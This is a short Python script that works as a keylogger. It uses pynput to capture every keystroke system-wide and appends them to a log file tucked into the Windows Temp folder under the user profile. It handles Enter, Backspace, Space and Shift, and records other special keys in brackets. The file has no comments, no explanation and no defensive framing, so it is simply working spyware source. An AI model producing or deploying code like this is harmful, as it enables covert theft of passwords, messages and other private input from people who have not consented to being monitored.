from pynput import keyboard
import os
logFilePath = os.path.join(os.getenv('USERPROFILE'), 'AppData', 'Local', 'Temp', 'log.txt')
shiftPressed = False
def onPress(key):
    global shiftPressed
    try:
        if key == keyboard.Key.enter:
            with open(logFilePath, 'a') as f:
                f.write('\n')
        elif key == keyboard.Key.backspace:
            with open(logFilePath, 'rb+') as f:
                f.seek(0, 2)
                size = f.tell()
                if size > 0:
                    f.seek(size - 1)
                    f.truncate()
        elif key == keyboard.Key.space:
            with open(logFilePath, 'a') as f:
                f.write(' ')
        elif key in (keyboard.Key.shift, keyboard.Key.shift):
            shiftPressed = True
        else:
            with open(logFilePath, 'a') as f:
                char = key.char.upper() if shiftPressed else key.char
                f.write(f'{char}')
    except AttributeError:
        with open(logFilePath, 'a') as f:
            f.write(f'[{key}]')
def onRelease(key):
    global shiftPressed
    if key in (keyboard.Key.shift, keyboard.Key.shift):
        shiftPressed = False
with keyboard.Listener(on_press=onPress, on_release=onRelease) as listener:
    listener.join()